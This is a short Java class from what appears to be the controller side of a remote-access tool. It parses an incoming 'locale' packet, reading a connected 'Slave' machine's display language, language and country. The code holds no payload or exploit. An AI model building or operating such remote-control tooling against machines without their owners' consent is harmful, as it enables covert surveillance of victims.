package com.redpois0n.packets.in;

import java.io.DataInputStream;

import com.redpois0n.Slave;

public class PacketLOCALE extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.setDisplayLanguage(slave.readLine());
		slave.setLanguage(slave.readLine());
		slave.setLongCountry(slave.readLine());

	}

}
